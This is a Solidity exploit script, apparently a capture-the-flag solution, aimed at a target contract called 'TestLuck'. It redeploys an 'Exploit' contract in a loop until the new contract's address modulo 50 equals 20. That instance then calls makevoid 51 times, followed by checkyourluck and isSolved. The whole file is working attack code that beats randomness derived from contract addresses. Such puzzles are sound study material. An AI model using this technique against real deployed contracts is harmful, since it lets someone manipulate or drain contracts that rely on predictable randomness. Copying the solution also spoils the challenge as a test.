// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {

    Exploit public exp;

    constructor() {}

    function attack(address target) public{
        while (true) {
            exp = new Exploit(target);
            if (uint256(uint160(address(exp))) % 50 == 20){
                break;
            }
        }
    }
}


contract Exploit {

    address target;

    constructor(address _target){
        target = _target;
        if (uint256(uint160(address(this))) % 50 == 20){
            for(uint i; i < 51; i++) {
                TestLuck(target).makevoid();
            }
            TestLuck(target).checkyourluck();
            TestLuck(target).isSolved();
        }
    }
}

interface TestLuck {
    function makevoid() external;
    function checkyourluck() external;
    function isSolved() external;
}
